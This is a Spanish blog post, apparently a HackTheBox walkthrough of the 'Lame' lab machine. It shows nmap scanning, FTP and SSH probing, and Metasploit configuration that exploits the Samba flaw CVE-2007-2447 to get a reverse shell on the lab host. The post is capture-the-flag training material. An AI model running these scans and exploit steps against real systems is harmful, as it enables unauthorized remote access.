---
layout: post
title:  "Maquina Lame Hackthebox (metaesploit)"
summary: "Guia para resolver la maquina Lame de hackthebox"
author: drone
date: '2023-10-25'
category: ['hacking','metaesploit', 'linux']
tags: hacking
thumbnail:
keywords: hackthebox lame hackthebox guide
usemathjax: false
permalink: /blog/adding-categories-tags-in-posts/
---

## Maquina Lame

Este es un walkthrough para la resolución de la **Maquina Lame**. En esta guía veremos la explotación de la vulnerabilidad **CVE-2007-2447** también conocida como **username map script** que afecta el servicio **samba**, utilizado para compartir recursos en una red. Esta vulnerabilidad nos permitirá ejecutar comandos de manera remota en la maquina objetivo.

Antes de pasar directamente a la vulnerabilidad iremos haciendo algunas pruebas con los demás servicios para ver si también es que podemos atacar por algún otro puerto.

1.-Ping al objetivo, Por el **ttl** podemos darnos cuenta de que es una máquina **Linux**.

  ![Ping](/assets/maquinas/Lame/01Lame.png)

  ```jsx
ping 10.10.10.3
```

2.-Escaneamos e identificamos todos los puertos abiertos del objetivo.

  ![Ping](/assets/maquinas/Lame/02Lame.png)

  ```jsx
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3
```

3.-Identificamos los servicios que están corriendo en los puertos abiertos.

  ![Ping](/assets/maquinas/Lame/03Lame.png)

  ```jsx
sudo nmap -sCV -p21,22,139,445,3632 -Pn 10.10.10.3
```

4.- En los resultados del escaneo podemos ver que tenemos el puerto 21 abierto y que el **inicio de sesión anónimo** está habilitado lo que da pie a que se pueda acceder al equipo objetivo a través de esta mala configuración en el servicio. Cuando estamos en un caso similar comprobaremos primero que realmente tengamos acceso y después tratar de visualizar, descargar o cargar archivos mediante **ftp**.

![Ping](/assets/maquinas/Lame/04Lame.png)

5.- Intentamos acceder por algún usuario por default que utiliza este servicio, utilizare el usuario y contraseña **ftp:fpt**. Como se puede ver tenemos cierto acceso y enseguida se tratan de listar archivos.

  ![Ping](/assets/maquinas/Lame/05Lame.png)

  ```jsx
ftp 10.10.10.3
```

6.- Tratamos de subir un archivo para comprobar si tenemos permisos de escritura. Al parecer no tenemos permisos.

  ![Ping](/assets/maquinas/Lame/06Lame.png)

  ```jsx
put file
```

7.- Se trato de descargar los archivos a través de la conexión ftp para revisar si podíamos descargar algún archivo oculto. 

  ![Ping](/assets/maquinas/Lame/07Lame.png)

  ```jsx
wget -m --no-passive ftp://ftp:ftp@10.10.10.3
```

8.- Como vimos que no pudimos hacer nada mediante la **autenticación anónima (Anonymous login)**. Entonces regresaremos al escaneo y buscaremos vulnerabilidades sobre el software y la versión que está utilizando el puerto 21 para el servicio **fpt**.  

  ![Ping](/assets/maquinas/Lame/08Lame.png)

9.- Ahora iniciaremos una consola de **metasploit** para buscar vulnerabilidades referentes a vsftpd **2.3.4** y explotar la máquina. Vemos que si existe un **exploit**.

  ![Ping](/assets/maquinas/Lame/09Lame.png)

  ```jsx
msf6 > search vsftpd 2.3.4
```

10.- Ya vimos que tenemos un **exploit** para el servicio de **ftp** que se está usando. Procederemos a configurarlo y posteriormente ejecutarlo.

  ![Ping](/assets/maquinas/Lame/10Lame.png)

11.- Explotamos, aquí este **exploit** no servirá dado que requiere que posteriormente se tengan unas credenciales validas.

  ![Ping](/assets/maquinas/Lame/11Lame.png)

  ```jsx
exploit
```

12.- Lo que tenemos que hacer ahora es regresar a nuestro escaneo de puertos y servicios para buscar otros vectores de ataque en los demas puertos. Seguiremos con el puerto 22 donde está corriendo el servicio de **SSH (Secure Shell)** conexión de acceso remoto cifradas.

13.- Con **NMAP** Procedemos a buscar vulnerabilidades en el puerto 22. Los resultados nos indican que no se encontraron vulnerabilidades.

  ![Ping](/assets/maquinas/Lame/13Lame.png)

  ```jsx
nmap -p 22 --script "vuln" 10.10.10.3 -Pn
ó
nmap -p 22 --script "vuln and safe" 10.10.10.3 -Pn
```

14.- Buscaremos vulnerabilidades a través de **metaesploit**, según los resultados arrojados ningún **exploit** nos sireve ya que la primera opción es un módulo auxiliar para **enumerar** usuarios y el segundo es un **exploit** para Windows.

  ![Ping](/assets/maquinas/Lame/14Lame.png)

  ```jsx
msf6 > search OpenSSH 4
```

15.- Cuando tenemos un puerto 22 podemos intentar es iniciar sesión con el usuario **ROOT**, este usuario viene por defecto activado en **SSH** podemos intentar entrar si es que no deshabilitaron esta opción, por lo que se ve no está activado este usuario.

  ![Ping](/assets/maquinas/Lame/15Lame.png)

  ```jsx
ssh root@10.10.10.3
```

16.- Como tampoco pudimos explotar el puerto 22 regresaremos a nuestro escaneo e intentaremos con otro puerto, en este caso iremos con el puerto 139.

17.- Buscaremos vulnerabilidades en el puerto 139 con **NMAP**. Tampoco pudimos encontrar vulnerabilidades por este puerto.

  ![Ping](/assets/maquinas/Lame/16Lame.png)

  ```jsx
nmap -p 139 --script "vuln" 10.10.10.3 -Pn
ó
nmap -p 139 --script "vuln and safe" 10.10.10.3 -Pn
```

18.- Ahora pasaremos a buscar por el puerto 445, les adelanto que aquí es donde está la vulnerabilidad, entonces regresaremos a nuestro escaneo del principio. Veremos que también hay un servicio **samba** en el puerto 445 y que nos da también la versión que esta corriendo.

En esta ocasión **nmap** no nos ayuda con la búsqueda de la vulnerabilidad haremos uso de una web llamda **https://www.exploit-db.com/** y tomando la versión de **samba** que se está ejecutando, ahora si nos muestra la clave de la vulnerabilidad que presenta este servicio. En los anteriores puertos se puede hacer el mismo procedimiento, se omitió porque la web nos daba los mismos resultados que **nmap**.

![Ping](/assets/maquinas/Lame/18Lame.png)

19.- Procederemos a buscar el **exploit** en **metasploit**.

![Ping](/assets/maquinas/Lame/19Lame.png)

  ```jsx
msfconsole

search CVE-2007-2447
```
20.- Ahora procederemos a usar y configurar el **exploit**, indicamos los puertos e IPs involucradas.

![Ping](/assets/maquinas/Lame/20Lame.png)

  ```jsx
use 0

set RHOSTS 10.10.10.3

set RPORT 445

set LHOST 10.10.10.6

set LPORT 2666
```

21.-Explotamos!.

![Ping](/assets/maquinas/Lame/21Lame.png)

  ```jsx
run
```

22.-Se genera la conexión y podemos ver que entramos al equipo objetivo.

![Ping](/assets/maquinas/Lame/22Lame.png)

  ```jsx
whoami

pwd
```